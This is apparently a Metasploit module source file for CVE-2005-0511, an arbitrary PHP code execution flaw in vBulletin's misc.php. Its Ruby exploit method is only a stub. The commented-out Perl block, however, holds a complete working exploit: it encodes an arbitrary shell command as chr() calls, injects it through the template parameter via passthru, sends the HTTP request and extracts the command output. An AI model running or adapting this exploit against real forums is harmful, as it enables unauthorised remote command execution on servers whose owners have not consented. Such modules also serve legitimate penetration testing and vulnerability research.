require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'vBulletin misc.php Template Name Arbitrary Code Execution',
			'Description'    => %q{
				This module exploits an arbitrary PHP code execution flaw in
				the vBulletin web forum software. This vulnerability is only
				present when the "Add Template Name in HTML Comments" option
				is enabled. All versions of vBulletin prior to 3.0.7 are
				affected.
					
			},
			'Author'         => [ 'str0ke <str0ke@milw0rm.com>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '14047'],
					[ 'CVE', '2005-0511'],
					[ 'MIL', '81'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Feb 22 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
#        Title: vBulletin <= 3.0.6 (Add Template Name in HTML Comments = Yes) command execution eXploit
#    Name: php_vb3_0_6.pm
# License: Artistic/BSD/GPL
#         Info: Trying to get the command execution exploits out of the way on milw0rm.com. M's are always good.
#
#
#  - This is an exploit module for the Metasploit Framework, please see
#     http://metasploit.com/projects/Framework for more information.
##

package Msf::Exploit::php_vbulletin_template;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'vBulletin misc.php Template Name Arbitrary Code Execution',
	'Version'  => '$Revision$',
	'Authors'  => [ 'str0ke < str0ke [at] milw0rm.com >' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'RPATH' => [1, 'DATA', 'Path to the misc.php script', '/forum/misc.php'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
			This module exploits an arbitrary PHP code execution flaw in the vBulletin web
		forum software. This vulnerability is only present when the "Add Template Name in HTML Comments"
		option is enabled. All versions of vBulletin prior to 3.0.7 are affected.
}),

	'Refs' =>
	  [
		['OSVDB', '14047'],
		['CVE',   '2005-0511'],
		['MIL',   '81'],
	  ],

	'Payload' =>
	  {
		'Space' => 512,
		'Keys'  => ['cmd', 'cmd_bash'],
	  },

	'Keys' => ['vbulletin'],

	'DisclosureDate' => 'Feb 22 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $target_port    = $self->GetVar('RPORT');
	my $vhost          = $self->GetVar('VHOST') || $target_host;
	my $path           = $self->GetVar('RPATH');
	my $cmd            = $self->GetVar('EncodedPayload')->RawPayload;

	# Add an echo on each end for easy output capturing
	$cmd = "echo _cmd_beg_;".$cmd.";echo _cmd_end_";

	# Encode the command as a set of chr() function calls
	my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));

	# Create the get request data
	my $data = "?do=page&template={\${passthru($byte)}}";

	my $req =
	  "GET $path$data HTTP/1.1\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Content-Type: application/html\r\n".
	  "Content-Length: ". length($data)."\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending the malicious vBulletin request...");

	$s->Send($req);

	my $results = $s->Recv(-1, 20);
	$s->Close();

	if ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {
		my $out = $1;
		$out =~ s/^\s+|\s+$//gs;
		if ($out) {
			$self->PrintLine('----------------------------------------');
			$self->PrintLine('');
			$self->PrintLine($out);
			$self->PrintLine('');
			$self->PrintLine('----------------------------------------');
		}
	}
	return;
}

1;

=end


end
end	
